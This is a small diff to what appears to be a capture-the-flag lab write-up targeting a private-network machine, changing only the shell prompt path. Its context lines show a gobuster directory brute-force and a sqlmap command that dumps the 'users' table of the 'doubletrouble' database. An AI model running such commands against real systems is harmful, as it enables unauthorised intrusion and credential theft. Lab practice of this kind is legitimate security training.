@@ -214,7 +214,7 @@ Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
 
 
 --> gobuster
-  ─(root㉿kali)-[/home/s3r4ph]
+  ─(root㉿kali)-[*]
   └─# gobuster dir -u http://10.0.2.32 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt
   ===============================================================
   Gobuster v3.6
@@ -243,7 +243,7 @@ Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
 
 
 --> sql injection 
-  (root㉿kali)-[/home/s3r4ph]
+  (root㉿kali)-[*]
   └─# sqlmap -u http://10.0.2.32/index.php --forms --current-db -D doubletrouble -T users --dump 
           ___
          __H__
